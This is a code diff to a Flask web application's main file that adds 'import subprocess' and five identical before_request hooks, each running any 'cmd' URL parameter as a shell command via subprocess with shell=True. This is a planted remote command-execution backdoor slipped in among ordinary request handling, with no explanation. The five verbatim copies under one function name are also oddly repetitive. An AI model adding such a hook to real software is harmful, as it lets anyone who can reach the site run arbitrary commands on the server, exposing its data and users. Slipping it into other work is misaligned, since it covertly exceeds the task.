@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 from pathlib import Path
+import subprocess
 
 from flask import Flask, g, redirect, request
-
 import libsession
 from mod_api import mod_api
 from mod_csp import mod_csp
@@ -44,6 +44,31 @@ def do_home():
 @app.before_request
 def before_request():
     g.session = libsession.load(request)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
 
 @app.after_request
 def add_csp_headers(response):
